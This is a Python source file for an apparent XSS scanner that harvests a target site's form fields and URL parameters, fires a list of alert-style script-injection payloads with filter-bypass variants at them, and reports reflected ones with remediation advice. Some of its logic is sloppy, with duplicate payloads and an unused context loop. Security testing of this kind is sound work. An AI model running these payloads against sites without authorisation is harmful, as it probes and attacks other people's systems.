import requests
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs
import re
import json
import time
from concurrent.futures import ThreadPoolExecutor

class XSSScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.forms = []
        self.params = []
        
        # Common XSS payloads
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            '"><body onload=alert(1)>',
            '"><iframe src=javascript:alert(1)>',
            '"><input onfocus=alert(1) autofocus>',
            '"><details open ontoggle=alert(1)>',
            '"><marquee onstart=alert(1)>',
            '"><video><source onerror=alert(1)>',
            '"><audio src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '"><svg><script>alert(1)</script></svg>',
            '"><svg><animate onbegin=alert(1) attributeName=x>',
            '"><svg><animate onload=alert(1) attributeName=x>',
            '"><svg><set attributeName=onload to=alert(1)>',
            '"><svg><handler evt=onload to=alert(1)>',
            '"><svg><listener event=load to=alert(1)>',
            '"><svg><handler evt=onload to=alert(1)>',
            '"><svg><listener event=load to=alert(1)>'
        ]
        
        # Common XSS contexts
        self.xss_contexts = {
            'html': r'<[^>]*>',
            'attribute': r'=[\'"][^\'"]*[\'"]',
            'script': r'<script[^>]*>.*?</script>',
            'url': r'url\([\'"]?[^\'"]*[\'"]?\)',
            'css': r'style=[\'"][^\'"]*[\'"]',
            'javascript': r'javascript:[^\'"]*'
        }
        
        # Common XSS filters and their bypasses
        self.filter_bypasses = {
            'script': [
                '<scr<script>ipt>',
                '<scr\x00ipt>',
                '<scr\x0Aipt>',
                '<scr\x0Dipt>',
                '<scr\x08ipt>',
                '<scr\x0Cipt>',
                '<scr\x09ipt>'
            ],
            'onerror': [
                'on\x00error',
                'on\x0Aerror',
                'on\x0Derror',
                'on\x08error',
                'on\x0Cerror',
                'on\x09error'
            ],
            'alert': [
                'al\x00ert',
                'al\x0Aert',
                'al\x0Dert',
                'al\x08ert',
                'al\x0Cert',
                'al\x09ert'
            ]
        }

    def scan_xss(self) -> Dict[str, List[Dict]]:
        """
        Scan for XSS vulnerabilities
        """
        results = {
            "vulnerabilities": [],
            "forms": [],
            "params": [],
            "details": []
        }
        
        try:
            # Find all forms and parameters
            self._find_forms_and_params()
            results["forms"] = self.forms
            results["params"] = self.params
            
            # Test each parameter for XSS
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for param in self.params:
                    futures.append(executor.submit(self._test_parameter, param))
                    
                for future in futures:
                    vulns = future.result()
                    if vulns:
                        results["vulnerabilities"].extend(vulns)
                        
            # Add detailed information
            results["details"] = self._get_scan_details(results)
            
        except Exception as e:
            print(f"Error scanning for XSS: {str(e)}")
            
        return results

    def _find_forms_and_params(self) -> None:
        """
        Find all forms and parameters on the target
        """
        try:
            response = requests.get(self.target_url)
            content = response.text
            
            # Find all forms
            form_pattern = r'<form[^>]*>.*?</form>'
            forms = re.finditer(form_pattern, content, re.DOTALL)
            
            for form in forms:
                form_html = form.group()
                form_action = re.search(r'action=[\'"]([^\'"]*)[\'"]', form_html)
                form_method = re.search(r'method=[\'"]([^\'"]*)[\'"]', form_html)
                
                if form_action:
                    action = urljoin(self.target_url, form_action.group(1))
                else:
                    action = self.target_url
                    
                method = form_method.group(1).upper() if form_method else 'GET'
                
                # Find all input fields
                inputs = re.finditer(r'<input[^>]*name=[\'"]([^\'"]*)[\'"][^>]*>', form_html)
                for input_field in inputs:
                    self.params.append({
                        "url": action,
                        "method": method,
                        "param": input_field.group(1),
                        "type": "form"
                    })
                    
            # Find URL parameters
            parsed = urlparse(self.target_url)
            if parsed.query:
                query_params = parse_qs(parsed.query)
                for param in query_params:
                    self.params.append({
                        "url": self.target_url,
                        "method": "GET",
                        "param": param,
                        "type": "url"
                    })
                    
        except Exception as e:
            print(f"Error finding forms and parameters: {str(e)}")

    def _test_parameter(self, param: Dict) -> List[Dict]:
        """
        Test a parameter for XSS vulnerabilities
        """
        vulnerabilities = []
        
        try:
            # Test each payload
            for payload in self.xss_payloads:
                # Test with different contexts
                for context_name, context_pattern in self.xss_contexts.items():
                    # Test with filter bypasses
                    for bypass in self.filter_bypasses.get('script', []):
                        modified_payload = payload.replace('<script>', bypass)
                        
                        # Send request
                        if param["method"] == "GET":
                            test_url = f"{param['url']}?{param['param']}={modified_payload}"
                            response = requests.get(test_url)
                        else:
                            data = {param["param"]: modified_payload}
                            response = requests.post(param["url"], data=data)
                            
                        # Check response
                        if self._check_xss_success(response, modified_payload):
                            vulnerabilities.append({
                                "url": param["url"],
                                "parameter": param["param"],
                                "method": param["method"],
                                "payload": modified_payload,
                                "context": context_name,
                                "type": "XSS",
                                "details": self._get_vulnerability_details(param, modified_payload, context_name)
                            })
                            
        except Exception as e:
            print(f"Error testing parameter {param['param']}: {str(e)}")
            
        return vulnerabilities

    def _check_xss_success(self, response: requests.Response, payload: str) -> bool:
        """
        Check if XSS payload was successful
        """
        try:
            content = response.text.lower()
            payload_lower = payload.lower()
            
            # Check if payload is reflected
            if payload_lower in content:
                # Check if payload is not encoded
                if not self._is_payload_encoded(payload, content):
                    # Check if payload is in a vulnerable context
                    if self._is_vulnerable_context(payload, content):
                        return True
                        
        except:
            pass
            
        return False

    def _is_payload_encoded(self, payload: str, content: str) -> bool:
        """
        Check if payload is HTML encoded
        """
        encoded_chars = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;'
        }
        
        for char, encoded in encoded_chars.items():
            if char in payload and encoded in content:
                return True
                
        return False

    def _is_vulnerable_context(self, payload: str, content: str) -> bool:
        """
        Check if payload is in a vulnerable context
        """
        try:
            # Find payload position in content
            pos = content.find(payload.lower())
            if pos == -1:
                return False
                
            # Check surrounding context
            before = content[max(0, pos-50):pos]
            after = content[pos+len(payload):min(len(content), pos+len(payload)+50)]
            
            # Check for script tags
            if '<script' in before and '</script>' in after:
                return True
                
            # Check for event handlers
            event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover']
            for handler in event_handlers:
                if handler in before:
                    return True
                    
            # Check for attributes
            if '=' in before and ('"' in after or "'" in after):
                return True
                
        except:
            pass
            
        return False

    def _get_vulnerability_details(self, param: Dict, payload: str, context: str) -> Dict:
        """
        Get detailed information about the vulnerability
        """
        details = {
            "risk_level": "High",
            "description": "",
            "remediation": "",
            "context": context,
            "impact": ""
        }
        
        if context == 'script':
            details["description"] = "XSS in JavaScript context"
            details["remediation"] = "Encode output in JavaScript context using appropriate encoding"
            details["impact"] = "Can execute arbitrary JavaScript code in user's browser"
            
        elif context == 'html':
            details["description"] = "XSS in HTML context"
            details["remediation"] = "Encode output in HTML context using HTML encoding"
            details["impact"] = "Can inject arbitrary HTML content"
            
        elif context == 'attribute':
            details["description"] = "XSS in HTML attribute context"
            details["remediation"] = "Encode output in attribute context using HTML attribute encoding"
            details["impact"] = "Can break out of attributes and inject malicious code"
            
        elif context == 'url':
            details["description"] = "XSS in URL context"
            details["remediation"] = "Encode output in URL context using URL encoding"
            details["impact"] = "Can inject malicious URLs"
            
        elif context == 'css':
            details["description"] = "XSS in CSS context"
            details["remediation"] = "Encode output in CSS context using CSS encoding"
            details["impact"] = "Can inject malicious CSS"
            
        return details

    def _get_scan_details(self, results: Dict) -> List[Dict]:
        """
        Generate detailed scan information
        """
        details = []
        
        try:
            # Add summary information
            details.append({
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "total_forms": len(results["forms"]),
                "total_params": len(results["params"]),
                "scan_time": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            
            # Add vulnerability statistics
            vuln_stats = {}
            for vuln in results["vulnerabilities"]:
                context = vuln["context"]
                if context not in vuln_stats:
                    vuln_stats[context] = 0
                vuln_stats[context] += 1
                
            details.append({
                "vulnerability_statistics": vuln_stats
            })
            
            # Add risk assessment
            risk_levels = {
                "High": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "High"]),
                "Medium": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "Medium"]),
                "Low": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "Low"])
            }
            
            details.append({
                "risk_assessment": risk_levels
            })
            
        except Exception as e:
            print(f"Error generating scan details: {str(e)}")
            
        return details 